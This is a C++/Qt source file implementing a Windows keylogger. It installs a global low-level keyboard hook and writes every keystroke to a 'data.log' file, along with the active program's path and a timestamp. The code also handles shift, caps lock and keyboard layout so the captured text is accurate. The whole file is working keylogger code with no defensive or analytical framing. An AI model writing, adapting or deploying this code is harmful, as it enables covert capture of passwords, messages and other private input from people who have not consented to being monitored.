#include "klog.h"

Klog &Klog::instance()
{
    static Klog _instance;
    return _instance;
}

void Klog::setParameters(const bool &work, const int &seconds)
{
    isWorking = work;
    if (seconds == 0)
        timer->stop();
    else
        timer->start(seconds*1000);
}

void Klog::setPath(const QString &newPath)
{
    //Create log file
    path = newPath;
    logFile = new QFile(path + "/data.log");
}

Klog::Klog(QObject *parent) :
    QObject(parent),
    isWorking(true),
    currProcess()
{
    timer = new QTimer(this);
    connect(timer, &QTimer::timeout, this, &Klog::timerIsUp);

    HINSTANCE hInstance = GetModuleHandle(NULL);

    //Register hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
                                          keyboardHookProc,
                                          hInstance,
                                          0);

    if (keyboardHook == NULL)
        qDebug() << "Keyboard hook installation error.";
}

LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    //If Keylogger is ON
    if (Klog::instance().isWorking)
    {
        // If key is pressed
        if (wParam == WM_KEYDOWN)
        {
            //Open log file
            if ( ! Klog::instance().logFile->open(QIODevice::Append | QIODevice::Text) )
                qDebug () << "Cannot create log file";

            QTextStream log(Klog::instance().logFile);

            //Get process ID and thread ID
            DWORD processId;
            GUITHREADINFO gti;
            ZeroMemory(&gti, sizeof(GUITHREADINFO));
            gti.cbSize = sizeof(GUITHREADINFO);
            GetGUIThreadInfo(0, &gti);
            DWORD threadId = GetWindowThreadProcessId(gti.hwndActive, &processId);

            //Get process handle
            HANDLE handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
            TCHAR procPath[MAX_PATH];

            //Get process path
            if (GetModuleFileNameEx(handle, 0, procPath, MAX_PATH))
            {
                //If process name has changed
                QString& prevProc = Klog::instance().currProcess;
                QString currProc = QString::fromWCharArray((LPTSTR)procPath);
                if (currProc != prevProc)
                {
                    //Write process name and time to log
                    log << "\n\n" << currProc << "\t" << QDateTime::currentDateTime().toString("hh:mm:ss dd.MM.yyyy") << "\n";
                    Klog::instance().currProcess = QString::fromWCharArray(procPath);
                }
            }
            //For 64-bit programs
            else if (GetProcessImageFileName(handle, procPath, MAX_PATH))
            {
                //Get path in device form
                QString devicePath( QString::fromWCharArray((LPTSTR)procPath) );

                //Transform device form path to drive letters
                TCHAR driveLetter = 'A';
                TCHAR szTarget[512] = {0};
                while(driveLetter <= 'Z')
                {
                    TCHAR szDeviceName[3] = {driveLetter, ':', '\0'};
                    //szTarget[512] = {0};
                    //Get drive letters of device names
                    if(QueryDosDevice(szDeviceName, szTarget, 511) != 0)
                    {
                        if(wcsncmp(procPath, szTarget, wcslen(szTarget)) == 0)
                            break;
                    }
                    driveLetter++;
                }

                //Replace device name with drive letter
                devicePath.replace(0, wcslen(szTarget), (QChar)driveLetter + ':');

                //If process name has changed
                QString& prevProc = Klog::instance().currProcess;
                QString& currProc = devicePath;
                if (currProc != prevProc)
                {
                    //Write process name and time to log
                    log << "\n\n" << currProc << "\t" << QDateTime::currentDateTime().toString("hh:mm:ss dd.MM.yyyy") << "\n";
                    Klog::instance().currProcess = currProc;
                }

            }

            CloseHandle(handle);

            //KBDLLHOOKSTRUCT  contains information about a low-level keyboard input event:
            //vkCode, scanCode, flags, time, dwExtraInfo
            KBDLLHOOKSTRUCT*  kbdHook = (KBDLLHOOKSTRUCT*) (lParam);

            //Print keys
            switch (kbdHook->vkCode) {
                case VK_DELETE:
                    log << "<DEL>";
                    break;
                case VK_BACK:
                    log << "<BACK>";
                    break;
                case VK_RETURN:
                    log << "\n";
                    break;
                case VK_LCONTROL:
                case VK_RCONTROL:
                    log << "<CTRL>";
                    break;

                case VK_CAPITAL:    break;
                case VK_LSHIFT:     break;
                case VK_RSHIFT:     break;
                case VK_INSERT:		break;
                case VK_END:		break;
                case VK_PRINT:		break;

                case VK_LEFT:		break;
                case VK_RIGHT:		break;
                case VK_UP:			break;
                case VK_DOWN:		break;

                //Visible keys
                default:

                //Check Shift and CapsLock state
                bool isDownShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool isDownCapslock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                bool isDownCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;

                BYTE kbdState[256];
                wchar_t buff[4];

                GetKeyboardState(kbdState);
                if (isDownShift) kbdState[16] = 0x80;
                if (isDownCapslock) kbdState[20] = 0x01;
                if (isDownCtrl) kbdState[17] = 0x00;

                //Get keyboard layout for current thread
                HKL kbdLayout = GetKeyboardLayout(threadId);
                //Translate virtual-key code  to the corresponding Unicode character.
                ToUnicodeEx(kbdHook->vkCode, kbdHook->scanCode, kbdState, buff, _countof(buff), 0, kbdLayout);

                log << QString::fromWCharArray(buff);
            }
            Klog::instance().logFile->close();
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
